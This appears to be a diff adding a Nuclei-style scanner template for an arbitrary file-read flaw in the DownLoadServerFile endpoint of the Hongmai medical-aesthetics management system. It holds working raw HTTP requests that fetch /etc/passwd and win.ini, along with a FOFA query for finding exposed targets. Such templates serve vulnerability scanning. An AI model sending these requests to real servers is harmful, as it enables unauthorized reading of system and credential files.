@@ -1,0 +1,54 @@
+id: hmcsoft-DownLoadServerFile-fileread
+info:
+  name: 宏脉医美行业管理系统 DownLoadServerFile - fileread
+  author: leadlife
+  severity: high
+  description: 宏脉医美行业管理系统是由宏脉信息技术（广州）股份有限公司开发的一款服务于医美行业管理服务的系统
+  reference: 
+    - 
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: title="宏脉医美行业管理系统"
+    hunter-query: demo
+    tips: 
+    repair:
+    version:
+  tags: 2024,fileread,hmcsoft
+
+http:
+  - raw:
+      - |
+        POST /zh-CN/PublicInterface/DownLoadServerFile?filePath=c:/windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Connection: keep-alive
+        Content-Length: 8
+        Accept-Encoding: gzip, deflate, br
+
+        filePath
+
+      - |
+        POST /zh-CN/PublicInterface/DownLoadServerFile?filePath=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Connection: keep-alive
+        Content-Length: 8
+        Accept-Encoding: gzip, deflate, br
+
+        filePath
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
